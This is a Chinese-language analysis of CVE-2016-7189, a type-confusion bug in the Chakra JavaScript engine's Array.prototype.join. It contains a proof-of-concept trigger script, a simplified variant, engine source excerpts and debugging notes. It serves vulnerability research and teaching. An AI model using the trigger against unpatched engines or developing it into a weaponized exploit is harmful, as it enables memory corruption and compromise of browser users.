
# CVE-2016-7189分析

标签（空格分隔）： Chakra

---

## POC

```
var t = new Array(1,2,3);
t.length = 100;
var o = {};
Object.defineProperty(o, '3', {
get: function() {
t[0] = {};
for(var i = 0; i < 100; i++){
t[i] = {a : i};
}
return 7;
}
});
t.__proto__ = o;
var j = [];
var s = j.join.call(t);
```

观察一下`poc`，`poc`首先创建了一个`array t`，之后创建`object o`，并对`o`设置一个`getter`。之后把`t`的`__proto__`设为`o`，在对`t`调用`Array.prototype.join`。

在`getter`中会把`t`中的所有元素设为对象`{a:i}`。

## 调试

```
var t = new Array(1);
t.length = 3;
var o = {};
Object.defineProperty(o,'1',{
get: function() {
t[0] = {};
return 0;
}
});
t.__proto__ = o;
var s = Array.prototype.join.call(t);
```

简化`POC`进行调试，发现程序触发`Assert`异常

```
Assert(VirtualTableInfo<JavascriptNativeIntArray>::HasVirtualTable(pArr)
|| VirtualTableInfo<CrossSiteObject<JavascriptNativeIntArray>>::HasVirtualTable(pArr));
```

之所以会触发这个`Assert`异常是因为`pArr`的虚表类型为`JavascriptArray::vtable`，而不是`JavascriptNativeIntArray::vtable`，由此推测这是一个`Array`对象的类型混淆。

根据调用关系可以看到是`JavascriptArray::EntryJoin`函数中触发了`crash`。同时由`POC`可以看出`t`的初始类型是`JavascriptNativeIntArray`，在`getter`中的赋值会导致`t`的类型变为`JavascriptArray`，而这个过程就在`Array.prototype.join`中发生。当然这里只是猜测，需要通过调试来说话。

## Array.prototype.join

```
join() 方法将数组（或一个类数组对象）的所有元素连接到一个字符串中。
let a = ['Wind', 'Rain', 'Fire'];
a.join();
// 'Wind,Rain,Fire'
```

对应于`Chakra`的`implementation`是有如下几个函数

```
JavascriptArray::JoinArrayHelper
JavascriptArray::JoinHelper
JavascriptArray::EntryJoin
amd64_CallFunction
```

其中主要的处理是在`JoinArrayHelper`中完成的

```
//因为var t = new Array(1);的t数组为NativeIntArray类型
case Js::TypeIds_NativeIntArray:
res = JoinArrayHelper(JavascriptNativeIntArray::FromVar(arr), separator, scriptContext);
break;
```

关注`JavascriptArray::JoinArrayHelper`函数的流程，发现有以下代码值得注意

```
for (uint32 i = 1; i < arrLength; i++)
{
if (hasSeparator)
{
cs->Append(separator);
}
if (TemplatedGetItem(arr, i, &item, scriptContext))
{
cs->Append(JavascriptArray::JoinToString(item, scriptContext));
}
}
```

注意代码中调用了`TemplatedGetItem`,而这个函数最终会调用到`ES5ArrayTypeHandlerBase<T>::GetItem`。我们知道这个函数会调用到对`Object`设置的`Getter`。

```
template <class T>
BOOL ES5ArrayTypeHandlerBase<T>::GetItem(ES5Array* arr, DynamicObject* instance, Var originalInstance, uint32 index, Var* value, ScriptContext* requestContext)
{
...
IndexPropertyDescriptor* descriptor;
if (indexPropertyMap->TryGetReference(index, &descriptor))
{
if (descriptor->Attributes & PropertyDeleted)
{
*value = requestContext->GetMissingItemResult();
return false;
}
if (descriptor->Getter)
{
RecyclableObject* func = RecyclableObject::FromVar(descriptor->Getter);
*value = Js::JavascriptOperators::CallGetter(func, originalInstance, requestContext);
}
...
}
...
}
```

通过调试发现经过`if(TemplatedGetItem(arr, i, &item, scriptContext))`之后`array t`的类型由`Array`变成了`NativeIntArray`

```
arr 0x0000016e342304e0 Js::JavascriptNativeArray
|
V
if(TemplatedGetItem(arr, i, &item, scriptContext))
|
V
arr 0x0000016e3423b000 Js::JavascriptArray
```

这也印证了我们前面的猜测

## 其他

`POC`中还有一句`t.length = 100;`如果去掉这句`POC`是不能触发的。

原因是因为代码的逻辑是获取目标`array`的长度，然后逐个元素的取出进行操作

```
const uint32 arrLength = arr->length;
for (uint32 i = 1; i < arrLength; i++)
{
if (hasSeparator)
{
cs->Append(separator);
}
if (TemplatedGetItem(arr, i, &item, scriptContext))
{
cs->Append(JavascriptArray::JoinToString(item, scriptContext));
}
}
```

但是注意我们对于`array t`调用`Object.defineProperty`的操作并不会增加`array`的`length`值，所以`TemplatedGetItem`也就不会对我们的`getter`进行调用，因此需要手动设置`array t`的长度使得我们的`getter`可以被调用。

## 总结

这是一个典型的对`Array`设置`getter`导致类型混淆的样例，通过这一个漏洞可以看到这一系列漏洞的样貌。开发者在编程时没有考虑到`array`的类型可以在函数执行中途改变，而且假设`array`类型始终为`NativeArray`不变。但是事实上通过`getter`特性，在函数过程中可以执行用户控制的`callback`，导致`array`类型由`NativeArray`转变为`JavascriptArray`从而发生类型混淆。
